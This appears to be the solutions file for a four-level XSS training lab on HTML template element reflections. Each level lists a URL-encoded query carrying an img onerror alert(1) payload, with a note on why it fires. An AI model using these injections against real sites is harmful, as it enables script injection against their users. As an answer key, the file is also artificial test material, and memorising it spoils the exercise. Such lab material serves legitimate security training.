# tplel — solutions

HTML `<template>` element reflections: inert content reactivated via innerHTML/appendChild.

### tplel-level1

`/tplel/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: template innerHTML copied to out via innerHTML — onerror fires

### tplel-level2

`/tplel/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: template.content.cloneNode + appendChild — onerror fires on insert

### tplel-level3

`/tplel/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: query JSON-encoded then concat to t.innerHTML and re-innerHTML — JSON string sees `<img...>` as HTML

### tplel-level4

`/tplel/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: template.innerHTML = JSON; then out.innerHTML = t.innerHTML — img onerror
